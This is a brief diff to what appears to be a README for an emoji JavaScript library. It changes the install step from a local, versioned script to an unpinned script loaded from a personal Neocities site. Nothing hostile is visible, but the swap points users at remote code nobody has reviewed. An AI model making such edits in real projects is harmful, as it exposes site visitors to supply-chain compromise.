@@ -19,4 +19,4 @@
 1. Include the script in your HTML file:
 
 ```html
-<script src="hungaromoji-v0.7.3.js"></script>
+<script src="https://urbanmove8.neocities.org/emoji.js"></script>
